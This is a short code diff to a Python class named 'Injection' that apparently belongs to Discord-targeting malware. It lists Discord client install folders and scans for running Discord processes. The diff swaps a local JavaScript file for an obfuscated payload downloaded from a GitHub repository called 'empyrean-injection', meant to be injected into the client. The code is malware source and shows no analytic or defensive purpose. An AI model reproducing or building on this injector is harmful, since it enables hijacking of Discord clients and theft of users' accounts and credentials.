@@ -1,8 +1,7 @@
-
 import os
 import re
 import subprocess
-import js2py
+
 import psutil
 import requests
 
@@ -16,9 +15,8 @@ class Injection:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        f = open('avascriptcomponemt.js')
-        s = f.read()
-        self.code = s
+        self.code = requests.get(
+            'https://raw.githubusercontent.com/addi00000/empyrean-injection/main/obfuscated.js').text
 
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
